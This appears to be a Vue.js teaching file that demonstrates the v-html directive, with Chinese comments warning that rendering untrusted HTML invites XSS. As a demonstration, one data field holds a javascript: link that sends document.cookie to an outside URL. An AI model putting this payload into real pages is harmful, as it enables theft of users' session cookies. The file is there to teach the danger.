<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html 指令</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <div>Hello ! {{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
<script>

    /* 
        v-html 指令:
            1. 作用: 指向指定节点中渲染包含 html 结构的内容
            2.  与插值语法的区别:
                    (1). v-html 会替换掉节点中所有的内容, {{xxx}} 则不会
                    (2). v-html 可以识别 html 结构
            3. 严重注意: 
                    (1). 在网上动态渲染任意 HTML 是非常危险的, 容易导致 xss(冒充身份) 攻击
                    (2). 一定要在可信的内容上使用 v-html, 永远不要用在用户提交内容上 !
    */

    Vue.config.productionTip = false;
 
    new Vue({
        el: "#root",
        data: {
            name: "wenjing",
            str: '<h2>余生多多指教！文静</h2>',
            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击看看</a>'
        }
    });
</script>

</html>
